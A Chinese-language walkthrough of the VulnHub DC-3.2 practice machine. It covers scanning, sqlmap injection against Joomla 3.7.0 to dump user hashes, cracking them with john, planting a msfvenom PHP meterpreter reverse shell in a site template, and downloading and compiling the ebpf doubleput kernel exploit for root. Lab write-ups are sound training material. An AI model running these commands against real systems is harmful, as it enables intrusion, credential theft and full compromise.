## 复盘 *

## 靶机地址：

[DC: 3.2 ~ VulnHub](https://www.vulnhub.com/entry/dc-32,312/)





## 信息收集

### 主机探活

```
arp-scan -l
```

![image-20250312232405061](./assets/image-20250312232405061.png)

确定目标主机ip地址：

192.168.6.26

 

### 扫描目标主机开放端口

```
nmap -P- -sS -sV -Pn 192.168.6.26
```

![image-20250312233033841](./assets/image-20250312233033841.png)

开放了：

- 80 http服务 Apache 2.4.18



 

 

### 访问192.168.6.26

![image-20250312232414884](./assets/image-20250312232414884.png)

```
This time, there is only one flag, one entry point and no clues.
To get the flag, you'll obviously have to gain root privileges.
How you get to be root is up to you - and, obviously, the system.
Good luck - and I hope you enjoy this little challenge. :-)

这次只有一个flag，一个入口点，没有线索。
要获得flag，你显然需要获取root权限。
如何获得root权限就看你自己了——当然，还有系统。
祝你好运——希望你喜欢这个小挑战。 :-)
```





### dirsearch扫描目录

```
dirsearch -u 192.168.6.26
```

![image-20250312232426965](./assets/image-20250312232426965.png)

![image-20250312232430894](./assets/image-20250312232430894.png)

存在

- robots.txt

- README.txt

- /administrator/ （管理员登录界面）

  

### 访问/administrator

管理员登录界面（Joomla）

![image-20250312233312953](./assets/image-20250312233312953.png)



### 访问robots.txt

Joomla CMS

![image-20250312232441135](./assets/image-20250312232441135.png)

### 访问README.txt

![image-20250312232446513](./assets/image-20250312232446513.png)

 

Joomla CMS

 

### wahtweb识别网站指纹信息

```
whatweb -v 192.168.6.26
```

![image-20250312232452130](./assets/image-20250312232452130.png)

![image-20250312232454709](./assets/image-20250312232454709.png)

 

确定目标信息

- Apache/2.4.18（Ubuntu）

- CMS：Joomla

 

 

### 使用joomscan扫描

```
Joomscan --url 192.168.6.26
```

![image-20250312232502924](./assets/image-20250312232502924.png)

确定Joomla版本信息 3.7.0

 

### 搜索漏洞库

```
searchsploit joomla 3.7.0
```

![image-20250312232508759](./assets/image-20250312232508759.png)

存在sql注入漏洞

 

### 查看该漏洞

```
searchsploit -x 42003
```

![image-20250312232518319](./assets/image-20250312232518319.png)

![image-20250312232521510](./assets/image-20250312232521510.png)

提供了sqlmap注入的payload

```
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

 

### 尝试SQL注入

```
sqlmap -u "http://192.168.6.26/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![image-20250312232530283](./assets/image-20250312232530283.png)

![image-20250312232533105](./assets/image-20250312232533105.png)

成功获取数据库名

- joomladb

 

接着获取表名

```
sqlmap -u "http://192.168.6.26/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" --tables -p list[fullordering]
```

![image-20250312232541694](./assets/image-20250312232541694.png)

![image-20250312232545085](./assets/image-20250312232545085.png)

![image-20250312232551778](./assets/image-20250312232551778.png)

 

存在__users表(注意是两个\_)

 

获取字段名

```
sqlmap -u "http://192.168.6.26/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T  "#__users" --columns -p list[fullordering]
```

![image-20250312232601045](./assets/image-20250312232601045.png)

![image-20250312232603926](./assets/image-20250312232603926.png)

存在name和password字段

 

获取name和password数据信息

```
sqlmap -u "http://192.168.6.26/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C "name,password" --dump -p list[fullordering]
```

![image-20250312232613110](./assets/image-20250312232613110.png)

![image-20250312232624038](./assets/image-20250312232624038.png)

 

### 使用john爆破密码

```
john 2.txt
```

![image-20250312232630717](./assets/image-20250312232630717.png)



![image-20250312232639648](./assets/image-20250312232639648.png)

得到密码

- snoopy

 

 

### 成功登录后台

![image-20250312232702519](./assets/image-20250312232702519.png)

 

寻找可利用的位置



###  通过修改浏览器默认样式注入木马

找到网站样式模块

![image-20250312232708059](./assets/image-20250312232708059.png)

![image-20250312232710757](./assets/image-20250312232710757.png)

![image-20250312232713673](./assets/image-20250312232713673.png)

 



### 利用msfvenom生成后门木马

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.6.5 lport=9999 -f raw >9999.php
```

![image-20250312232721654](./assets/image-20250312232721654.png)

![image-20250312232724360](./assets/image-20250312232724360.png)

 

### 将木马写入index.php文件中

![image-20250312232729856](./assets/image-20250312232729856.png)



### msf监听

进入msf终端

```
msfconsole
```

```
use exploit/multi/handler
```

设置参数

开始监听

![image-20250312232735447](./assets/image-20250312232735447.png)

访问192.168.6.26/index.php

 

### 成功获取shell

![image-20250312232745274](./assets/image-20250312232745274.png)

得知当前用户权限www-data

 



## 提权

### python转换终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20250312232751036](./assets/image-20250312232751036.png)



### suid查找

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20250312232755879](./assets/image-20250312232755879.png)

 

### 查看系统信息

```
uname -a
```

查看系统信息

```
cat etc/issue
```

查看关于操作系统发行版的基本信息

![image-20250312232801452](./assets/image-20250312232801452.png)

![image-20250312232805403](./assets/image-20250312232805403.png)

![image-20250312232807976](./assets/image-20250312232807976.png)

确定为

- Ubuntu 16.04

 

### 搜索可利用漏洞

```
searchsploit Ubuntu 16.04
```



![image-20250312232813736](./assets/image-20250312232813736.png)

 找到一个提权漏洞





### 下载文件

```
searchsploit -m 39972.txt
```

![image-20250312232819744](./assets/image-20250312232819744.png)

![image-20250312232824241](./assets/image-20250312232824241.png)

 

下载exp（可以选择在目标主机上直接wget下载exp）（也可以本地下载然后上传）

 

 

### wget下载exp

```
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

![image-20250312232834981](./assets/image-20250312232834981.png)

 

ls查看

![image-20250312232842548](./assets/image-20250312232842548.png)

成功下载

 

### unzip解压

```
unzip 39772.zip
```

![image-20250312232847757](./assets/image-20250312232847757.png)

接着解压exploit.tar文件

```
tar -xf exploit.tar
```

![image-20250312232853547](./assets/image-20250312232853547.png)

得到ebpf_map_doubleput_exploit文件夹

![image-20250312232901221](./assets/image-20250312232901221.png)

### 执行compile.sh

```
./compile.sh
```

![image-20250312232906524](./assets/image-20250312232906524.png)

成功编译

![image-20250312232912484](./assets/image-20250312232912484.png)

doubleput.c

 

 

### 执行doubleput

```
./doubleput
```

![image-20250312232918641](./assets/image-20250312232918641.png)

成功获取root权限

 

### 获取flag

![image-20250312232923567](./assets/image-20250312232923567.png)